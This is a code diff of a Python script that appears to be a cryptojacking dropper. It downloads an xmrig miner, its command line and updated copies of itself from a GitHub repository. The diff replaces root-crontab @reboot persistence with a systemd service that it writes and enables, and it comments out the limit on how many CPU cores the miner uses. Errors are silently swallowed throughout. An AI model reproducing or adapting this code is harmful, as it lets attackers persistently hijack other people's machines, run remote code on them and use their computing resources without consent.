@@ -5,7 +5,7 @@ try:
     import requests
     import time
     import subprocess
-    import multiprocessing
+    #import multiprocessing
 except:
     pass
 
@@ -34,7 +34,7 @@ while True:
     working_dir = os.path.dirname(os.path.realpath(__file__))
     print(working_dir)
     path_app = os.path.realpath(__file__)
-    version_chinh = 3.0
+    version_chinh = 4.0
     link_version_chinh = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/version_chinh'
     link_dao = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/dao.py'
     try:
@@ -59,16 +59,15 @@ while True:
     
     if operate_system == 'lin':
         try:
-            path = '/var/spool/cron/crontabs/root'
-            data = '@reboot screen -dm python3 %s' % path_app
-            fileopen = open(path, 'r')
-            noidung = fileopen.read()
-            fileopen.close()
-            if data not in noidung:
-                fileopen = open(path, 'a+')
+            path_service = '/lib/systemd/system/dao.service'
+            data = '[Unit]\nDescription=dao service\n[Service]\nType=simple\nExecStart=/usr/bin/python3 %s\n[Install]\nWantedBy=multi-user.target' % path_app
+            if not os.path.exists(path_service):
+                fileopen = open(path_service, 'w+')
                 fileopen.write(data + '\n')
                 fileopen.close()
-            os.system('chmod 600 %s' %path)
+            #os.system('chmod 600 %s' %path)
+                os.system('systemctl daemon-reload')
+                os.system('systemctl enable dao')
         except:
             pass
     #utopia
@@ -145,10 +144,10 @@ while True:
         except:
             pass
         #xmrig
-        cores_cpu = multiprocessing.cpu_count()
-        cores_tru = int(round(cores_cpu*40/100+0.9))
-        cores = cores_cpu - cores_tru
-        print('So cores de dao la %s' %cores)
+        #cores_cpu = multiprocessing.cpu_count()
+        #cores_tru = int(round(cores_cpu*40/100+0.9))
+        #cores = cores_cpu - cores_tru
+        #print('So cores de dao la %s' %cores)
         link_version_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/version_xmrig'
         link_download_xmrig = 'https://github.com/giautoidi/giautoidi/raw/beta/vietlai/xmrig_linux.gz'
         link_command_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/command_xmrig'
